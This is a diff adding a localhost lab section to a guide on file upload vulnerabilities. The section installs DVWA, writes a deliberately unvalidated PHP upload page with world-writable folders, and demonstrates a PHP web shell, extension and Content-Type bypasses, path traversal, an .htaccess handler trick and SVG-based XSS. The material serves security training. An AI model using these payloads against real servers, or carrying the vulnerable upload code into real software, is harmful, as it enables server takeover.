@@ -79,6 +79,113 @@ To prevent file upload vulnerabilities, follow these best practices:
 
 ---
 
+Here’s how you can set up a **File Upload Vulnerability Lab** for testing.
+
+---
+
+## ** Lab Setup: File Upload Vulnerability Testing**
+### **1️) Environment Setup**
+You can use **DVWA (Damn Vulnerable Web App)** or create a custom vulnerable upload page.
+
+#### **A. Using DVWA**
+1. Install **DVWA** (Damn Vulnerable Web App) inside a Kali Linux or Ubuntu machine:
+   ```bash
+   sudo apt update && sudo apt install apache2 php php-mysqli mysql-server -y
+   git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
+   sudo chmod -R 777 /var/www/html/dvwa/
+   sudo systemctl restart apache2
+   ```
+
+2. Open DVWA in your browser:  
+   - URL: `http://localhost/dvwa/`
+   - Default credentials:  
+     ```
+     Username: admin
+     Password: password
+     ```
+
+3. Navigate to `DVWA Security` and set security to **low**.
+
+4. Go to **File Upload** and try uploading different file types.
+
+---
+
+#### **B. Custom Vulnerable File Upload Page**
+If you want to create your own vulnerable web application:
+
+1. **Setup a PHP-based vulnerable upload page**
+   - Save the following code as `upload.php` inside `/var/www/html/`
+   ```php
+   <?php
+   if(isset($_FILES['file'])){
+       $file_name = $_FILES['file']['name'];
+       $file_tmp = $_FILES['file']['tmp_name'];
+       move_uploaded_file($file_tmp, "uploads/".$file_name);
+       echo "File uploaded: uploads/".$file_name;
+   }
+   ?>
+   <form action="" method="POST" enctype="multipart/form-data">
+       <input type="file" name="file" />
+       <input type="submit" value="Upload" />
+   </form>
+   ```
+2. **Create an upload directory** and give it write permissions:
+   ```bash
+   mkdir /var/www/html/uploads
+   chmod -R 777 /var/www/html/uploads
+   ```
+
+3. Restart the Apache server:
+   ```bash
+   systemctl restart apache2
+   ```
+
+4. Open `http://localhost/upload.php` and try uploading different files.
+
+---
+
+## **2️) Exploitation Scenarios**
+### **Scenario 1: Uploading a PHP Web Shell**
+- Create a simple PHP shell and save it as `shell.php`:
+  ```php
+  <?php system($_GET['cmd']); ?>
+  ```
+- Upload `shell.php` and access it via:
+  ```
+  http://localhost/uploads/shell.php?cmd=whoami
+  ```
+
+---
+
+### **Scenario 2: Bypassing File Extension Filtering**
+- Rename your shell file to `shell.php.jpg`
+- Use **Burp Suite** to change the `Content-Type` to `image/jpeg` before uploading.
+- If successful, access it via:
+  ```
+  http://localhost/uploads/shell.php.jpg?cmd=id
+  ```
+
+---
+
+### **Scenario 3: Overwriting Server Files (Directory Traversal)**
+If the application doesn't validate file paths, try:
+1. Uploading `../../../var/www/html/index.php` to overwrite the homepage.
+2. Uploading a `.htaccess` file:
+   ```
+   AddType application/x-httpd-php .jpg
+   ```
+   - Then, upload `shell.jpg` containing PHP code.
+
+---
+
+### **Scenario 4: XSS via SVG Upload**
+- Create an **SVG file** (`xss.svg`) containing:
+  ```xml
+  <svg><script>alert('XSS')</script></svg>
+  ```
+- Upload it and check if it executes in the browser.
+---
+
 #### **5. Tools for Testing File Upload Vulnerabilities**
 Security professionals can use the following tools to test for file upload vulnerabilities:
 
